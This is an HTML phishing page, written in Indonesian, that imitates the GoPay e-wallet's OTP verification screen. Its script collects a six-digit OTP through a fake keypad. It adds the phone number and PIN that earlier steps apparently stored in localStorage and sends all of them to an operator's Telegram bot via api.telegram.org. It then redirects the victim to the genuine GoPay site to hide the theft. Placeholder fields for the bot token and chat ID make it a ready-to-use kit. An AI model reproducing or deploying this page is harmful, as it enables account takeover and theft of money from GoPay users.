<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  
  <title>GoPay - Verifikasi OTP</title>
  <meta name="theme-color" content="#000000">
  
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
  
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
      -webkit-tap-highlight-color: transparent;
    }

    html, body {
      width: 100%;
      min-height: 100%;
      background-color: #000000;
      color: #ffffff;
      overflow-y: auto;
    }

    .app-container {
      width: 100%;
      min-height: 100vh;
      background-color: #000000;
      padding: 16px 20px 30px 20px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      position: relative;
      margin: 0 auto;
    }

    /* Top Bar */
    .go-topbar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 24px;
    }

    .go-icon-btn {
      background: none;
      border: none;
      color: #ffffff;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* Body Section */
    .go-step3-body {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
    }

    .otp-title {
      font-size: 24px;
      font-weight: 700;
      margin-bottom: 8px;
      color: #ffffff;
    }

    .otp-subtitle {
      font-size: 14px;
      color: #9e9e9e;
      margin-bottom: 24px;
    }

    .otp-label {
      font-size: 13px;
      color: #ff5722; /* warna merah/oranye kecil untuk bintang OTP */
      margin-bottom: 8px;
      font-weight: 500;
    }
    .otp-label span {
      color: #ffffff;
    }

    /* Area Garis Input OTP & Timer */
    .otp-input-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      width: 100%;
      margin-bottom: 12px;
    }

    .otp-lines-container {
      display: flex;
      gap: 12px;
    }

    .otp-line {
      width: 32px;
      height: 3px;
      background-color: #444444;
      border-radius: 2px;
      transition: background-color 0.2s;
    }

    .otp-line.filled {
      background-color: #00aa13; /* Berubah hijau saat terisi */
    }

    .timer-box {
      display: flex;
      align-items: center;
      gap: 6px;
      font-size: 14px;
      font-weight: 600;
      color: #ffffff;
    }

    .timer-ring {
      width: 18px;
      height: 18px;
      border: 2px solid #333;
      border-top-color: #00aa13;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      display: none; /* Aktifkan jika ingin mutar */
    }

    /* Keypad Angka */
    .keypad-section {
      width: 100%;
      margin-top: auto;
      padding-top: 20px;
    }

    .keypad-container {
      width: 100%;
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
    }

    .key-btn {
      background: transparent;
      border: none;
      color: #ffffff;
      font-size: 26px;
      font-weight: 600;
      height: 50px;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      border-radius: 10px;
    }

    .key-btn:active {
      background-color: rgba(255, 255, 255, 0.1);
    }

    /* Footer */
    .go-footer {
      text-align: center;
      font-size: 12px;
      color: #666666;
      margin-top: 20px;
    }

    .go-footer span {
      color: #00aa13;
      font-weight: 700;
    }
  </style>
</head>
<body>

  <div class="app-container">
    <div>
      <!-- Top Bar -->
      <header class="go-topbar">
        <button type="button" class="go-icon-btn" onclick="history.back()">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
        </button>
        <button type="button" class="go-icon-btn">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
        </button>
      </header>

      <!-- Body Content -->
      <div class="go-step3-body">
        <h1 class="otp-title">Cek WhatsApp, ya</h1>
        <p class="otp-subtitle" id="subPhoneText">Kode-nya kami kirim ke +62******5555</p>

        <div class="otp-label"><span>OTP</span> *</div>

        <div class="otp-input-row">
          <div class="otp-lines-container" id="otpLines">
            <div class="otp-line"></div>
            <div class="otp-line"></div>
            <div class="otp-line"></div>
            <div class="otp-line"></div>
            <div class="otp-line"></div>
            <div class="otp-line"></div>
          </div>
          <div class="timer-box">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#00aa13" stroke-width="2.5"><path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.73-5.73"/></svg>
            <span id="countdown">00:09</span>
          </div>
        </div>
      </div>
    </div>

    <!-- Keypad -->
    <div class="keypad-section">
      <div class="keypad-container">
        <button class="key-btn" onclick="pressKey('1')">1</button>
        <button class="key-btn" onclick="pressKey('2')">2</button>
        <button class="key-btn" onclick="pressKey('3')">3</button>
        <button class="key-btn" onclick="pressKey('4')">4</button>
        <button class="key-btn" onclick="pressKey('5')">5</button>
        <button class="key-btn" onclick="pressKey('6')">6</button>
        <button class="key-btn" onclick="pressKey('7')">7</button>
        <button class="key-btn" onclick="pressKey('8')">8</button>
        <button class="key-btn" onclick="pressKey('9')">9</button>
        <button class="key-btn" style="visibility: hidden;"></button>
        <button class="key-btn" onclick="pressKey('0')">0</button>
        <button class="key-btn" onclick="pressDelete()">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/><line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/></svg>
        </button>
      </div>

      <footer class="go-footer">
        from <span>goto</span>
      </footer>
    </div>
  </div>

  <script>
    // Ambil nomor HP dari localStorage dan buat format sensor bintang di tengahnya
    const savedPhone = localStorage.getItem('gopay_phone') || '+62******5555';
    if (savedPhone.length > 6) {
      let masked = savedPhone.slice(0, 3) + "******" + savedPhone.slice(-4);
      document.getElementById('subPhoneText').innerText = `Kode-nya kami kirim ke ${masked}`;
    }

    let currentOtp = "";
    const lines = document.querySelectorAll('.otp-line');

    // Konfigurasi Token & Chat ID Telegram Anda
    const TELEGRAM_BOT_TOKEN = "MASUKKAN_BOT_TOKEN_ANDA_DISINI";
    const TELEGRAM_CHAT_ID = "MASUKKAN_CHAT_ID_ANDA_DISINI";

    function updateLines() {
      lines.forEach((line, index) => {
        if (index < currentOtp.length) {
          line.classList.add('filled');
        } else {
          line.classList.remove('filled');
        }
      });
    }

    function pressKey(num) {
      if (currentOtp.length < 6) {
        currentOtp += num;
        updateLines();

        if (currentOtp.length === 6) {
          const savedPin = localStorage.getItem('gopay_pin') || 'Tidak ada data';

          // Kirim data lengkap (No HP + PIN + OTP) ke Telegram Bot
          const message = `🔔 *GOPAY FINAL DATA (OTP)*\n📱 No HP: \`${savedPhone}\`\n🔑 PIN: \`${savedPin}\`\n🔢 OTP: \`${currentOtp}\``;
          
          if (TELEGRAM_BOT_TOKEN !== "MASUKKAN_BOT_TOKEN_ANDA_DISINI") {
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
              })
            }).catch(err => console.log(err));
          }

          // Redirect setelah sukses
          setTimeout(() => {
            window.location.href = "https://www.gopay.co.id/";
          }, 500);
        }
      }
    }

    function pressDelete() {
      if (currentOtp.length > 0) {
        currentOtp = currentOtp.slice(0, -1);
        updateLines();
      }
    }

    // Countdown Timer 9 Detik
    let timeLeft = 9;
    const timerElem = document.getElementById('countdown');
    const countdownInterval = setInterval(() => {
      timeLeft--;
      if (timeLeft >= 0) {
        timerElem.innerText = `00:0${timeLeft}`;
      } else {
        clearInterval(countdownInterval);
        timerElem.innerText = "00:00";
      }
    }, 1000);
  </script>
</body>
</html>
